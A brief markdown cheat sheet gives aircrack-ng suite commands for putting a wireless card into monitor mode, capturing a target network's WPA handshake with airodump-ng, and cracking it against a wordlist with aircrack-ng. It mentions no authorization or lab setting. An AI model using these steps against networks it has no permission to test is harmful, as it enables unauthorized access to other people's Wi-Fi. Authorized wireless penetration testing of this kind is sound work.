### list wireless network interfaces, as well as their current mode (managed/monitor/etc)
`iwconfig`
'ip a'
`ifconfig` may also help
if your card doesn't show up, try, "ifconfig wlan0 up" or "ifconfig wlan1 up" and try again

### put specified wireless network interface in monitor mode. note that this will change the name of the interface
`airmon-ng start <card>`

### listen for handshakes, recording caputres to specified file
hint: first find the channel the target is on. add -c and then the channel number
`airodump-ng --write <outputFile> <wireless interface> -c <channel number>`

### crack handshake
`aircrack-ng <capfile.cap> -w <wordList>`
if it doesn't work:
	+ the password may not be in the list, try a new one
	+ you may have a bad handshake, try capturing a new one

